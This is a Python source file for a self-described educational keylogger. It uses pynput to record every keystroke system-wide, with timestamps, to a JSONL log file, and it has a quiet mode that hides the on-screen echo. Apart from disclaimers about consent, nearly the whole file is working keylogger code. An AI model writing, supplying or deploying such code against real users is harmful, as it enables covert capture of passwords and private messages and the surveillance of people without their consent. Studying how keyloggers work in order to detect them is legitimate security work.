#!/usr/bin/env python3
"""
Basic Keylogger - Project 4
A cross-platform keylogger demonstrating keyboard monitoring.

EDUCATIONAL USE ONLY. Only use on systems you own or have explicit permission to monitor.

This is for:
- Understanding how keyloggers work (for defense)
- Parental control tools (with consent)
- Security research
- Employee monitoring (with proper disclosure and consent)
"""

import sys
import time
import json
import datetime
import threading
import argparse
from pathlib import Path
from typing import Optional

LOG_DIR = Path(__file__).parent / "logs"
LOG_FILE = LOG_DIR / "keystrokes.jsonl"
LOG_DIR.mkdir(exist_ok=True)

# Key code mappings
KEY_MAP = {
    1: "<ESC>",
    2: "<1>", 3: "<2>", 4: "<3>", 5: "<4>", 6: "<5>", 7: "<6>", 8: "<7>", 9: "<8>", 10: "<9>", 11: "<0>",
    12: "<->", 13: "<=>",
    14: "<BACKSPACE>",
    15: "<TAB>",
    16: "<Q>", 17: "<W>", 18: "<E>", 19: "<R>", 20: "<T>", 21: "<Y>", 22: "<U>", 23: "<I>", 24: "<O>", 25: "<P>",
    26: "<[>", 27: "<]>", 28: "<ENTER>",
    29: "<CTRL>",
    30: "<A>", 31: "<S>", 32: "<D>", 33: "<F>", 34: "<G>", 35: "<H>", 36: "<J>", 37: "<K>", 38: "<L>",
    39: "<;>", 40: "<\'>",
    41: "<`>",
    42: "<LSHIFT>",
    43: "<\\>",
    44: "<Z>", 45: "<X>", 46: "<C>", 47: "<V>", 48: "<B>", 49: "<N>", 50: "<M>",
    51: "<,>", 52: "<.>", 53: "</>",
    54: "<RSHIFT>",
    55: "<KP*>",
    56: "<ALT>",
    57: "<SPACE>",
    58: "<CAPS>",
    59: "<F1>", 60: "<F2>", 61: "<F3>", 62: "<F4>", 63: "<F5>", 64: "<F6>",
    65: "<F7>", 66: "<F8>", 67: "<F9>", 68: "<F10>",
    69: "<NUM>",
    70: "<SCROLL>",
    71: "<KP7>", 72: "<KP8>", 73: "<KP9>", 74: "<KP->",
    75: "<KP4>", 76: "<KP5>", 77: "<KP6>", 78: "<KP+>",
    79: "<KP1>", 80: "<KP2>", 81: "<KP3>", 82: "<KP0>",
    83: "<KP.>",
    85: "<F11>", 86: "<F12>",
}

class SimpleKeylogger:
    """Cross-platform basic keylogger."""
    
    def __init__(self, output_file=None, verbose=True):
        self.output_file = output_file or LOG_FILE
        self.verbose = verbose
        self.running = False
        self.buffer = ""
        self.buffer_size = 100  # Flush after 100 chars
        self.key_count = 0
        self.start_time = None
        
        # Stats
        self.stats = {
            "total_keys": 0,
            "special_keys": 0,
            "alphabetic": 0,
            "numeric": 0,
            "punctuation": 0
        }
    
    def is_alpha(self, char):
        return char.isalpha()
    
    def is_numeric(self, char):
        return char.isdigit()
    
    def is_printable(self, char):
        return len(char) == 1 and char.isprintable() and not char.isspace()
    
    def is_special(self, key_name):
        return key_name.startswith("<") and key_name.endswith(">")
    
    def get_key_name(self, key_code, shift_pressed=False):
        """Convert key code to readable name."""
        if key_code in KEY_MAP:
            name = KEY_MAP[key_code]
            if len(name) == 1 and not self.is_special(name):
                return name.upper() if shift_pressed else name
            return name
        return f"<KEY_{key_code}>"
    
    def log_keystroke(self, key_name, timestamp=None):
        """Log a single keystroke."""
        if timestamp is None:
            timestamp = datetime.datetime.now(datetime.timezone.utc).isoformat()
        
        # Update stats
        self.stats["total_keys"] += 1
        if self.is_special(key_name):
            self.stats["special_keys"] += 1
        elif len(key_name) == 1:
            if self.is_alpha(key_name):
                self.stats["alphabetic"] += 1
            elif self.is_numeric(key_name):
                self.stats["numeric"] += 1
            else:
                self.stats["punctuation"] += 1
        
        # Add to buffer
        self.buffer += key_name
        self.key_count += 1
        
        # Print if verbose
        if self.verbose:
            print(key_name, end="", flush=True)
        
        # Flush if buffer is full
        if len(self.buffer) >= self.buffer_size:
            self.flush()
        
        # Log to file
        entry = json.dumps({
            "timestamp": timestamp,
            "key": key_name,
            "count": self.key_count
        })
        with open(self.output_file, "a") as f:
            f.write(entry + "\n")
    
    def flush(self):
        """Flush buffer to file with newline."""
        if self.buffer:
            with open(self.output_file, "a") as f:
                f.write(f'{{"timestamp": "{datetime.datetime.now(datetime.timezone.utc).isoformat()}", "type": "buffer", "content": "{self.buffer}"}}\n')
            self.buffer = ""
    
    def print_stats(self):
        """Print keystroke statistics."""
        elapsed = time.time() - self.start_time if self.start_time else 0
        rate = self.key_count / elapsed if elapsed > 0 else 0
        
        print("\n" + "="*50)
        print("KEYLOGGER STATISTICS")
        print("="*50)
        print(f"Total keystrokes: {self.stats['total_keys']}")
        print(f"Duration: {elapsed:.1f} seconds")
        print(f"Keys per minute: {rate * 60:.1f}")
        print(f"\nBreakdown:")
        print(f"  Alphabetic: {self.stats['alphabetic']}")
        print(f"  Numeric: {self.stats['numeric']}")
        print(f"  Punctuation: {self.stats['punctuation']}")
        print(f"  Special keys: {self.stats['special_keys']}")
        print(f"\n[+] Log saved to: {self.output_file}")

class LinuxKeylogger(SimpleKeylogger):
    """Linux-specific keylogger using /dev/input."""
    
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.event_files = []
        self.listener_thread = None
    
    def find_keyboard_devices(self):
        """Find keyboard input devices."""
        import os
        import glob
        
        devices = []
        for event in glob.glob("/dev/input/event*"):
            try:
                # Try to get device name
                with open(event, 'rb') as f:
                    # This is a simplified check
                    devices.append(event)
            except:
                pass
        
        if not devices:
            print("[!] No input devices found. Try running as root.")
        return devices
    
    def start(self):
        """Start listening for keyboard input."""
        print(f"""
    ╔═══════════════════════════════════════════════════════╗
    ║     Basic Keylogger - Project 4                     ║
    ║                                                       ║
    ║     EDUCATIONAL USE ONLY                              ║
    ║     Only log keyboards you own or have permission    ║
    ╚═══════════════════════════════════════════════════════╝
        """)
        
        print("[*] Note: This uses pynput for cross-platform support")
        print("[*] Installing pynput if needed...\n")
        
        try:
            from pynput import keyboard
        except ImportError:
            print("[!] pynput not installed. Install with:")
            print("    pip install pynput")
            print("\n    OR use the evtest approach on Linux:")
            print("    sudo evtest /dev/input/event0")
            sys.exit(1)
        
        self.start_time = time.time()
        self.running = True
        
        print("[*] Logging keystrokes... (Ctrl+C to stop)\n")
        
        def on_press(key):
            try:
                if hasattr(key, 'char') and key.char:
                    self.log_keystroke(key.char)
                else:
                    self.log_keystroke(self.get_key_name(key.vk if hasattr(key, 'vk') else 0))
            except Exception as e:
                pass
        
        def on_release(key):
            if key == keyboard.Key.esc:
                return False  # Stop listener
        
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            try:
                listener.join()
            except KeyboardInterrupt:
                pass
        
        self.running = False
        self.flush()
        self.print_stats()

def main():
    parser = argparse.ArgumentParser(description="Basic Keylogger")
    parser.add_argument("-o", "--output", help="Output log file")
    parser.add_argument("-q", "--quiet", action="store_true", help="Quiet mode (no keystroke echo)")
    args = parser.parse_args()
    
    keylogger = LinuxKeylogger(output_file=args.output, verbose=not args.quiet)
    keylogger.start()

if __name__ == "__main__":
    main()
